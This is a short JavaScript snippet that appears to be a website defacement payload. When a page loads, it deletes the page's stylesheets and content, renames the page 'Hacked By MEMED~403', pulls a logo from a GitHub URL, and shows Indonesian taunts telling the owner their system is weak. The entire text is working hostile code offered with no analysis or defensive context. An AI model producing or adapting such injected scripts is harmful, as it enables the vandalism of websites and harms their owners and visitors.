<script>
document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('link[rel="stylesheet"], style').forEach(el => el.remove());
  document.body.removeAttribute('style');
  document.body.removeAttribute('class');
  document.title = 'Hacked By MEMED~403';

  const linkIcon = document.createElement('link');
  linkIcon.rel = 'icon';
  linkIcon.type = 'image/png';
  linkIcon.href = 'https://raw.githubusercontent.com/memed123-del/kk/refs/heads/main/IMG_20251011_193035_940.jpg';
  document.head.appendChild(linkIcon);

  const styleElement = document.createElement('style');
  styleElement.textContent = `
    body {
      background-color: white !important;
      color: black !important;
      text-align: center !important;
      font-family: monospace !important;
      margin-top: 80px !important;
    }
    h1 {
      color: red !important;
      font-size: 48px !important;
      margin-bottom: 30px !important;
      text-shadow: 0 0 4px red !important;
    }
    .logo-wrapper {
      width: 200px !important;
      height: 200px !important;
      margin: 0 auto 40px auto !important;
      border-radius: 50% !important;
      overflow: hidden !important;
      aspect-ratio: 1 / 1 !important;
      box-shadow: 0 0 10px rgba(0,0,0,0.2) !important;
    }
    .logo {
      width: 100% !important;
      height: 100% !important;
      object-fit: cover !important;
      object-position: 40% 10% !important;
    }
    p {
      font-size: 26px !important;
      margin: 20px 0 !important;
      color: black !important;
    }
    .warning {
      color: #b30000 !important;
      font-weight: bold !important;
      font-size: 22px !important;
      margin: 25px 0 !important;
    }
    .advice {
      color: #0066cc !important;
      font-size: 20px !important;
      margin: 15px 0 !important;
      font-style: italic !important;
    }
    footer {
      position: fixed !important;
      bottom: 10px !important;
      width: 100% !important;
      color: gray !important;
      font-size: 20px !important;
      font-weight: bold !important;
      letter-spacing: 0.5px !important;
      text-align: center !important;
    }
  `;
  document.head.appendChild(styleElement);

  document.body.innerHTML = `
    <div class="logo-wrapper">
      <img src="https://raw.githubusercontent.com/memed123-del/kk/refs/heads/main/IMG_20251011_193035_940.jpg" alt="MEMED~404 Logo" class="logo">
    </div>
    <h1>Hacked By MEMED~403</h1>
    <p>Sistem anda terlalu lemah</p>
    <p>Sistem anda tumbang bukan karena kami kuat. Tapi karena anda lemah</p>
    <footer>© 2025 MEMED~403 | Kami datang, sistem anda tumbang.</footer>
  `;
});
</script>
